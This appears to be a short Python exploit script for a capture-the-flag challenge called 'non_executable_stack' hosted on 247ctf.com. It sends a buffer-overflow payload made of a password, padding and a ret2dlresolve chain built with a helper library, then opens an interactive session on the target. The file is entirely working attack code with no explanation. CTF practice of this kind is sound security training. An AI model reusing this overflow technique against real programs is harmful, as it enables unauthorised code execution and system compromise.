#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./non_executable_stack')
host = args.HOST or '84c5c4c4bc646322.247ctf.com'
port = int(args.PORT or 50462)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()
payload = b"admin123\x00" + b"A"*35 + Ret2DLResolve()
re()
sl(payload)

io.interactive()
